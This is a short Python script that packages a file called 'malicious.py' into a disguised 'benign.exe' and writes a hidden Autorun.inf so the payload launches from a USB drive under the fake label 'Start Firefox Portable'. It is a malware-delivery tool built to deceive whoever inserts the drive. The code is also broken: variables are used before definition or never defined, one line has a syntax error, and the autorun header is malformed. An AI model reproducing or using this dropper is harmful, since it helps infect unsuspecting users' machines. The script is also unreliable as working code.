import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = os.getcwd()
pwd = os.path.join(pwd, "USB")

if os.path.isfile(exename):
    os.remove(exename)
print("Creating EXE")

#Create executable from python script
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--log-file=ERROR",
    "--name="+exename,
    "--icon="+icon
])

print("EXE created")

#Cleanup after Pyinstaller
shutil.move.(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")

print("Creating Autorun file")

#Create Autorun file
with open("Autorun.inf", "w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("label=My USB\n")
    o.write("Icon="+exename+"\n")

print("Setting up USB")

#Move files to USB and set to hidden
shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir)
print("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
os.system("attrib +h "+os.path.join(usbdir, "Autorun.inf"))
